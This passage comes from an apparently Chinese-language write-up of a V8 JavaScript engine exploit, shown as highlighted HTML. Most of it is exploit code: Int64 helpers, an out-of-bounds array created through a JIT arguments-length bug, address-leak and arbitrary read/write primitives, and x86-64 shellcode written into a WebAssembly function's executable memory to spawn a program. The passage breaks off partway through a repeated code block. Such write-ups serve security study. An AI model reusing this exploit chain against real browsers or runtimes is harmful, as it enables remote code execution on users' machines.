is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span><br>  <span class="hljs-comment">// due to double conversion constraints.</span><br>  <span class="hljs-built_in">this</span>.asJSValue = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">if</span> ((bytes[<span class="hljs-number">7</span>] == <span class="hljs-number">0</span> &amp;&amp; bytes[<span class="hljs-number">6</span>] == <span class="hljs-number">0</span>) || (bytes[<span class="hljs-number">7</span>] == <span class="hljs-number">0xff</span> &amp;&amp; bytes[<span class="hljs-number">6</span>] == <span class="hljs-number">0xff</span>))<br>          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RangeError</span>(<span class="hljs-string">&quot;Integer can not be represented by a JSValue&quot;</span>);<br><br>      <span class="hljs-comment">// For NaN-boxing, JSC adds 2^48 to a double value&#x27;s bit pattern.</span><br>      <span class="hljs-built_in">this</span>.assignSub(<span class="hljs-built_in">this</span>, <span class="hljs-number">0x1000000000000</span>);<br>      <span class="hljs-keyword">var</span> res = Struct.unpack(Struct.float64, bytes);<br>      <span class="hljs-built_in">this</span>.assignAdd(<span class="hljs-built_in">this</span>, <span class="hljs-number">0x1000000000000</span>);<br><br>      <span class="hljs-keyword">return</span> res;<br>  &#125;;<br><br>  <span class="hljs-comment">// Return the underlying bytes of this number as array.</span><br>  <span class="hljs-built_in">this</span>.bytes = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">Array</span>.from(bytes);<br>  &#125;;<br><br>  <span class="hljs-comment">// Return the byte at the given index.</span><br>  <span class="hljs-built_in">this</span>.byteAt = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">i</span>) </span>&#123;<br>      <span class="hljs-keyword">return</span> bytes[i];<br>  &#125;;<br><br>  <span class="hljs-comment">// Return the value of this number as unsigned hex string.</span><br>  <span class="hljs-built_in">this</span>.toString = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-comment">//console.log(&quot;toString&quot;);</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span> + hexlify(<span class="hljs-built_in">Array</span>.from(bytes).reverse());<br>  &#125;;<br><br>  <span class="hljs-comment">// Basic arithmetic.</span><br>  <span class="hljs-comment">// These functions assign the result of the computation to their &#x27;this&#x27; object.</span><br><br>  <span class="hljs-comment">// Decorator for Int64 instance operations. Takes care</span><br>  <span class="hljs-comment">// of converting arguments to Int64 instances if required.</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">operation</span>(<span class="hljs-params">f, nargs</span>) </span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;<br>          <span class="hljs-keyword">if</span> (<span class="hljs-built_in">arguments</span>.length != nargs)<br>              <span class="hljs-keyword">throw</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;Not enough arguments for function &quot;</span> + f.name);<br>          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">arguments</span>.length; i++)<br>              <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">arguments</span>[i] <span class="hljs-keyword">instanceof</span> Int64))<br>                  <span class="hljs-built_in">arguments</span>[i] = <span class="hljs-keyword">new</span> Int64(<span class="hljs-built_in">arguments</span>[i]);<br>          <span class="hljs-keyword">return</span> f.apply(<span class="hljs-built_in">this</span>, <span class="hljs-built_in">arguments</span>);<br>      &#125;;<br>  &#125;<br><br>  <span class="hljs-comment">// this = -n (two&#x27;s complement)</span><br>  <span class="hljs-built_in">this</span>.assignNeg = operation(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">neg</span>(<span class="hljs-params">n</span>) </span>&#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>          bytes[i] = ~n.byteAt(i);<br><br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.assignAdd(<span class="hljs-built_in">this</span>, Int64.One);<br>  &#125;, <span class="hljs-number">1</span>);<br><br>  <span class="hljs-comment">// this = a + b</span><br>  <span class="hljs-built_in">this</span>.assignAdd = operation(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params">a, b</span>) </span>&#123;<br>      <span class="hljs-keyword">var</span> carry = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>          <span class="hljs-keyword">var</span> cur = a.byteAt(i) + b.byteAt(i) + carry;<br>          carry = cur &gt; <span class="hljs-number">0xff</span> | <span class="hljs-number">0</span>;<br>          bytes[i] = cur;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>  &#125;, <span class="hljs-number">2</span>);<br><br>  <span class="hljs-comment">// this = a - b</span><br>  <span class="hljs-built_in">this</span>.assignSub = operation(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sub</span>(<span class="hljs-params">a, b</span>) </span>&#123;<br>      <span class="hljs-keyword">var</span> carry = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>          <span class="hljs-keyword">var</span> cur = a.byteAt(i) - b.byteAt(i) - carry;<br>          carry = cur &lt; <span class="hljs-number">0</span> | <span class="hljs-number">0</span>;<br>          bytes[i] = cur;<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>  &#125;, <span class="hljs-number">2</span>);<br><br>  <span class="hljs-comment">// this = a &amp; b</span><br>  <span class="hljs-built_in">this</span>.assignAnd = operation(<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">and</span>(<span class="hljs-params">a, b</span>) </span>&#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>          bytes[i] = a.byteAt(i) &amp; b.byteAt(i);<br>      &#125;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>;<br>  &#125;, <span class="hljs-number">2</span>);<br>&#125;<br><br><span class="hljs-comment">// Constructs a new Int64 instance with the same bit representation as the provided double.</span><br>Int64.fromDouble = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">d</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> bytes = Struct.pack(Struct.float64, d);<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Int64(bytes);<br>&#125;;<br><br><span class="hljs-comment">// Return -n (two&#x27;s complement)</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Neg</span>(<span class="hljs-params">n</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> Int64()).assignNeg(n);<br>&#125;<br><br><span class="hljs-comment">// Return a + b</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Add</span>(<span class="hljs-params">a, b</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> Int64()).assignAdd(a, b);<br>&#125;<br><br><span class="hljs-comment">// Return a - b</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Sub</span>(<span class="hljs-params">a, b</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> Int64()).assignSub(a, b);<br>&#125;<br><br><span class="hljs-comment">// Return a &amp; b</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">And</span>(<span class="hljs-params">a, b</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> Int64()).assignAnd(a, b);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hex</span>(<span class="hljs-params">a</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (a == <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0xUNDEFINED&quot;</span>;<br>  <span class="hljs-keyword">var</span> ret = a.toString(<span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">if</span> (ret.substr(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>) != <span class="hljs-string">&quot;0x&quot;</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0x&quot;</span>+ret;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lower</span>(<span class="hljs-params">x</span>) </span>&#123;<br>  <span class="hljs-comment">// returns the lower 32bit of double x</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseInt</span>((<span class="hljs-string">&quot;0000000000000000&quot;</span> + Int64.fromDouble(x).toString()).substr(-<span class="hljs-number">8</span>,<span class="hljs-number">8</span>),<span class="hljs-number">16</span>) | <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upper</span>(<span class="hljs-params">x</span>) </span>&#123;<br>  <span class="hljs-comment">// returns the upper 32bit of double x</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseInt</span>((<span class="hljs-string">&quot;0000000000000000&quot;</span> + Int64.fromDouble(x).toString()).substr(-<span class="hljs-number">16</span>, <span class="hljs-number">8</span>),<span class="hljs-number">16</span>) | <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">lowerint</span>(<span class="hljs-params">x</span>) </span>&#123;<br>  <span class="hljs-comment">// returns the lower 32bit of int x</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseInt</span>((<span class="hljs-string">&quot;0000000000000000&quot;</span> + x.toString(<span class="hljs-number">16</span>)).substr(-<span class="hljs-number">8</span>,<span class="hljs-number">8</span>),<span class="hljs-number">16</span>) | <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upperint</span>(<span class="hljs-params">x</span>) </span>&#123;<br>  <span class="hljs-comment">// returns the upper 32bit of int x</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseInt</span>((<span class="hljs-string">&quot;0000000000000000&quot;</span> + x.toString(<span class="hljs-number">16</span>)).substr(-<span class="hljs-number">16</span>, <span class="hljs-number">8</span>),<span class="hljs-number">16</span>) | <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">combine</span>(<span class="hljs-params">a, b</span>) </span>&#123;<br>  <span class="hljs-comment">//a = a &gt;&gt;&gt; 0;</span><br>  <span class="hljs-comment">//b = b &gt;&gt;&gt; 0;</span><br>  <span class="hljs-comment">//console.log(a.toString());</span><br>  <span class="hljs-comment">//console.log(b.toString());</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseInt</span>(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), <span class="hljs-number">16</span>);<br>&#125;<br><br><br><span class="hljs-comment">//padLeft用于字符串左补位</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">combineint</span>(<span class="hljs-params">a, b</span>) </span>&#123;<br>  <span class="hljs-comment">//a = a &gt;&gt;&gt; 0;</span><br>  <span class="hljs-comment">//b = b &gt;&gt;&gt; 0;</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">parseInt</span>(b.toString(<span class="hljs-number">16</span>).substr(-<span class="hljs-number">8</span>,<span class="hljs-number">8</span>) + (a.toString(<span class="hljs-number">16</span>)).padLeft(<span class="hljs-number">8</span>), <span class="hljs-number">16</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gc</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">16</span>; i++)&#123;<br>  <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>();<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clear_space</span>(<span class="hljs-params"></span>)</span>&#123;<br>gc();<br>gc();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_shell</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>+<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">utf8ToString</span>(<span class="hljs-params">h, p</span>) </span>&#123;<br>  <span class="hljs-keyword">let</span> s = <span class="hljs-string">&quot;&quot;</span>;<br>  <span class="hljs-keyword">for</span> (i = p; h[i]; i++) &#123;<br>    s += <span class="hljs-built_in">String</span>.fromCharCode(h[i]);<br>  &#125;<br>  <span class="hljs-keyword">return</span> s;<br>&#125;<br><br><span class="hljs-comment">//--------------------tools above---------------------------</span><br><br><span class="hljs-keyword">var</span> buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">96</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">2</span>,<span class="hljs-number">140</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">101</span>,<span class="hljs-number">110</span>,<span class="hljs-number">118</span>,<span class="hljs-number">4</span>,<span class="hljs-number">112</span>,<span class="hljs-number">117</span>,<span class="hljs-number">116</span>,<span class="hljs-number">115</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">150</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">71</span>,<span class="hljs-number">84</span>,<span class="hljs-number">111</span>,<span class="hljs-number">97</span>,<span class="hljs-number">100</span>,<span class="hljs-number">76</span>,<span class="hljs-number">117</span>,<span class="hljs-number">99</span>,<span class="hljs-number">107</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">146</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">140</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">16</span>,<span class="hljs-number">16</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>,<span class="hljs-number">65</span>,<span class="hljs-number">137</span>,<span class="hljs-number">221</span>,<span class="hljs-number">203</span>,<span class="hljs-number">1</span>,<span class="hljs-number">11</span>,<span class="hljs-number">11</span>,<span class="hljs-number">160</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">16</span>,<span class="hljs-number">11</span>,<span class="hljs-number">26</span>,<span class="hljs-number">87</span>,<span class="hljs-number">101</span>,<span class="hljs-number">98</span>,<span class="hljs-number">65</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">98</span>,<span class="hljs-number">108</span>,<span class="hljs-number">121</span>,<span class="hljs-number">32</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">100</span>,<span class="hljs-number">117</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">32</span>,<span class="hljs-number">108</span>,<span class="hljs-number">111</span>,<span class="hljs-number">97</span>,<span class="hljs-number">100</span>,<span class="hljs-number">101</span>,<span class="hljs-number">100</span>,<span class="hljs-number">0</span><br>]);<br><span class="hljs-keyword">var</span> wasmImports = &#123;<br>  env: &#123;<br>    puts: <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">puts</span> (<span class="hljs-params">index</span>) </span>&#123;<br>      <span class="hljs-built_in">console</span>.log(utf8ToString(h, index));<br>    &#125;<br>  &#125;<br>&#125;;<br><span class="hljs-keyword">let</span> m = <span class="hljs-keyword">new</span> WebAssembly.Instance(<span class="hljs-keyword">new</span> WebAssembly.Module(buffer),wasmImports);<br><span class="hljs-keyword">let</span> h = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint8Array</span>(m.exports.memory.buffer);<br><span class="hljs-keyword">let</span> f = m.exports.GToadLuck;<br><br>f();<br>%SystemBreak();<br><span class="hljs-keyword">var</span> leak = f;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fun</span>(<span class="hljs-params">arg</span>) </span>&#123;<br>  <span class="hljs-keyword">let</span> x = <span class="hljs-built_in">arguments</span>.length;<br>  a1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">0x10</span>);<br>  a1[<span class="hljs-number">0</span>] = <span class="hljs-number">1.1</span>;<br>  oob_double_Array = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">0x10</span>);<br>  oob_double_Array[<span class="hljs-number">0</span>] = <span class="hljs-number">1.1</span>;<br>  object_Array = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(<span class="hljs-number">0x10</span>);<br>  object_Array[<span class="hljs-number">0</span>] = &#123;&#125;;<br>  object_Array[<span class="hljs-number">1</span>] = leak;<br>  x = x &gt;&gt; <span class="hljs-number">16</span><br>  a1[x*<span class="hljs-number">19</span>] = <span class="hljs-number">2.60750842793813e-310</span>;<span class="hljs-comment">//0x0000300000000000</span><br>  a1[x*<span class="hljs-number">21</span>] = <span class="hljs-number">2.60750842793813e-310</span>;<br>  a1[x*<span class="hljs-number">41</span>] = <span class="hljs-number">2.60750842793813e-310</span>;<br>&#125;<br><br><span class="hljs-keyword">var</span> a1, oob_double_Array, object_Array,oob_buffer;<br><span class="hljs-keyword">var</span> a3 = [<span class="hljs-number">1.1</span>, <span class="hljs-number">2.2</span>];<br>a3.length = <span class="hljs-number">0x11000</span>;<br>a3.fill(<span class="hljs-number">3.3</span>);<br><span class="hljs-keyword">var</span> a4 = [<span class="hljs-number">1.1</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) fun(...a4);<br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;GT1&quot;</span>);<br>%DebugPrint(leak); <span class="hljs-comment">// debug 0x325565da4511 0x325565da44d9</span><br>%DebugPrint(fun);<br>%SystemBreak();<br><br>fun(...a3);<br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;GT2&quot;</span>);<br>%DebugPrint(a1);<br>%DebugPrint(oob_double_Array); <span class="hljs-comment">// debug 0x2a46939e779</span><br>%DebugPrint(object_Array);<br>f();<br>%SystemBreak();<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_space_read</span>(<span class="hljs-params">leak</span>)</span>&#123;<br>  object_Array[<span class="hljs-number">1</span>] = leak;<br>  <span class="hljs-keyword">return</span> oob_double_Array[<span class="hljs-number">23</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writePtr</span>(<span class="hljs-params">offset, address, value</span>)</span>&#123;<br>  oob_double_Array[offset] = address;<br>  fake_dv = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(oob_buffer);<br>  fake_dv[<span class="hljs-number">0</span>] = value;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readPtr</span>(<span class="hljs-params">offset, address</span>)</span>&#123;<br>  oob_double_Array[offset] = address;<br>  fake_dv = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Float64Array</span>(oob_buffer);<br>  <span class="hljs-keyword">return</span> fake_dv[<span class="hljs-number">0</span>];<br>&#125;<br><br>function_addr = oob_double_Array[<span class="hljs-number">23</span>];<br><span class="hljs-comment">//console.log(&quot;[+] the f() function addr is at &quot; + Int64.fromDouble(function_addr).toString());</span><br>oob_buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x1000</span>);<br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;GT3&quot;</span>);<br>%DebugPrint(oob_buffer); <span class="hljs-comment">// debug 0x2a46939e891</span><br>f();<br>%SystemBreak();<br><br>oob_buffer_addr = user_space_read(oob_buffer);<br><span class="hljs-comment">//console.log(&quot;[+] ob_buffer addr is at &quot; + Int64.fromDouble(oob_buffer_addr).toString());</span><br><br>oob_array_addr = user_space_read(oob_double_Array);<br><span class="hljs-comment">//console.log(&quot;[+] oob_double_Array addr is at &quot; + Int64.fromDouble(oob_array_addr).toString());</span><br>temp1 = Int64.fromDouble(oob_buffer_addr + <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0x1f</span>).asDouble() - oob_array_addr + <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0x81</span>).asDouble());<br>offset = lowerint(temp1) / <span class="hljs-number">8</span>;<br><span class="hljs-built_in">console</span>.log(offset.toString());<br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;GT4&quot;</span>);<br>f();<br>%SystemBreak();<br><br>shared_info = readPtr(offset, function_addr + <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0x17</span>).asDouble());<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[+] shared_info is at &quot;</span> + Int64.fromDouble(shared_info).toString());<br><br>wasm_exported_function_data = readPtr(offset, shared_info + <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0x7</span>).asDouble());<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[+] wasm_exported_function_data is at &quot;</span> + Int64.fromDouble(wasm_exported_function_data).toString());<br><br>instance = readPtr(offset, wasm_exported_function_data + <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0xf</span>).asDouble());<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[+] instance is at &quot;</span> + Int64.fromDouble(instance).toString());<br><span class="hljs-comment">//----------imported_function_targets is not double---------------</span><br>oob_double_Array[offset] = instance + <span class="hljs-keyword">new</span> Int64(<span class="hljs-number">0xbf</span>).asDouble(); <span class="hljs-comment">//backing store</span><br><span class="hljs-keyword">var</span> ift_buffer = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(oob_buffer);<br>imported_function_targets = d2u(ift_buffer[<span class="hljs-number">0</span>],ift_buffer[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">console</span>.log(ift_buffer[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">console</span>.log(ift_buffer[<span class="hljs-number">1</span>]);<br><br><span class="hljs-comment">//imported_function_targets = readPtr(offset, instance + new Int64(0xc7).asDouble());</span><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[+] imported_function_targets is at &quot;</span> + Int64.fromDouble(imported_function_targets).toString());<br><br>code_addr = readPtr(offset, imported_function_targets);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[+] code_addr is at &quot;</span> + Int64.fromDouble(code_addr).toString());<br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;GT5&quot;</span>);<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;[+] the f() code addr is at &quot;</span> + Int64.fromDouble(code_addr).toString());<br>f();<br>%SystemBreak();<br><br>oob_double_Array[offset] = code_addr; <span class="hljs-comment">//backing store</span><br><br><span class="hljs-keyword">var</span> shellcode = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Uint32Array</span>(oob_buffer);<br>shellcode[<span class="hljs-number">0</span>] = <span class="hljs-number">0x90909090</span>;<br>shellcode[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90909090</span>;<br>shellcode[<span class="hljs-number">2</span>] = <span class="hljs-number">0x782fb848</span>;<br>shellcode[<span class="hljs-number">3</span>] = <span class="hljs-number">0x636c6163</span>;<br>shellcode[<span class="hljs-number">4</span>] = <span class="hljs-number">0x48500000</span>;<br>shellcode[<span class="hljs-number">5</span>] = <span class="hljs-number">0x73752fb8</span>;<br>shellcode[<span class="hljs-number">6</span>] = <span class="hljs-number">0x69622f72</span>;<br>shellcode[<span class="hljs-number">7</span>] = <span class="hljs-number">0x8948506e</span>;<br>shellcode[<span class="hljs-number">8</span>] = <span class="hljs-number">0xc03148e7</span>;<br>shellcode[<span class="hljs-number">9</span>] = <span class="hljs-number">0x89485750</span>;<br>shellcode[<span class="hljs-number">10</span>] = <span class="hljs-number">0xd23148e6</span>;<br>shellcode[<span class="hljs-number">11</span>] = <span class="hljs-number">0x3ac0c748</span>;<br>shellcode[<span class="hljs-number">12</span>] = <span class="hljs-number">0x50000030</span>;<br>shellcode[<span class="hljs-number">13</span>] = <span class="hljs-number">0x4944b848</span>;<br>shellcode[<span class="hljs-number">14</span>] = <span class="hljs-number">0x414c5053</span>;<br>shellcode[<span class="hljs-number">15</span>] = <span class="hljs-number">0x48503d59</span>;<br>shellcode[<span class="hljs-number">16</span>] = <span class="hljs-number">0x3148e289</span>;<br>shellcode[<span class="hljs-number">17</span>] = <span class="hljs-number">0x485250c0</span>;<br>shellcode[<span class="hljs-number">18</span>] = <span class="hljs-number">0xc748e289</span>;<br>shellcode[<span class="hljs-number">19</span>] = <span class="hljs-number">0x00003bc0</span>;<br>shellcode[<span class="hljs-number">20</span>] = <span class="hljs-number">0x050f00</span>;<br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;GT6&quot;</span>);<br>%DebugPrint(f);<br>%SystemBreak();<br><br>f();<br></code></pre></td></tr></table></figure><p>gt2达成长度扩展，oob_double_Array即a2</p><p><img src="image-20220324215424596.png" alt="image-20220324215424596"></p><p>object_Array就紧跟在oob_double_Array下方</p><p>下面看leak函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">user_space_read</span>(<span class="hljs-params">leak</span>)</span>&#123;<br>  object_Array[<span class="hljs-number">1</span>] = leak;<br>  <span class="hljs-keyword">return</span> oob_double_Array[<span class="hljs-number">23</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span 